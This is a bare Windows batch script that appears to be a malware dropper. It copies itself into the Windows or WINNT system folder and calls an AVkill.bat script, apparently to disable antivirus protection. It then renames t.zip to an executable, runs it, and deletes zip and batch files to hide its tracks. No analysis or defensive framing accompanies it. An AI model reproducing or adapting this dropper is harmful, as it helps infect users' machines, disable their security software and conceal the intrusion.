   @echo off
   cls
   if exist c:\windows\command.com goto win98
   copy *.* c:\winnt
   cd \
   cd winnt
   call AVkill.bat
   cd \
   cd winnt
   ren t.zip *.exe
   t.exe
   del ke.bat
   cd \
   del temp
   del *.zip
   del *.bat
   exit

   :win98
   copy *.* c:\windows
   cd \
   cd windows
   call AVkill.bat
   cd \
   cd windows
   ren t.zip *.exe
   t.exe
   cd \
   cd temp
   del *.zip
   del *.bat
   exit
